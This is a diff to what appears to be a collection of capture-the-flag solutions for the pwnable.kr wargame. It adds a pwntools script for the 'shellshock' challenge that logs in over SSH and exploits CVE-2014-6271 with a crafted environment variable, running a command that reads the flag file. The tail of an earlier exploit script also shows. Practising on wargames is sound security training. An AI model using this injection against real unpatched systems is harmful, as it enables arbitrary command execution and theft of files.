@@ -217,3 +217,15 @@ p.sendline("C"*10)
 
 p.interactive()
 ```
+
+## shellshock
+
+#### Solution
+```python
+from pwn import *
+
+vm = ssh("shellshock", "pwnable.kr", 2222, "guest")
+
+payload = "env CVE_2014_6271='() { :;}; /bin/cat /home/shellshock/flag' /home/shellshock/shellshock"
+print(vm.process(["/bin/bash", "-c", payload]).recvall())
+```
